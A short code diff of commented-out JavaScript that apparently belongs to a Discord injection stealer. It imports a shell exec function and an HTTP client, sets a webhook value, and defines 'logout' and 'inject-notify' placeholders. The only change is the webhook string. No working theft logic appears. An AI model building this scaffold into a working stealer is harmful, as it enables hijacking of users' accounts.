@@ -5,7 +5,7 @@
 //const { exec } = require('child_process');
 //const axios = require('axios');
 //const buf_replace = require('buffer-replace');
-//const webhook = "discordass"
+//const webhook = "discordoi78ha.ss"
 //const config = {
 //    "logout": "%LOGOUT%1",
 //    "inject-notify": "%INJECTNOTI%1",
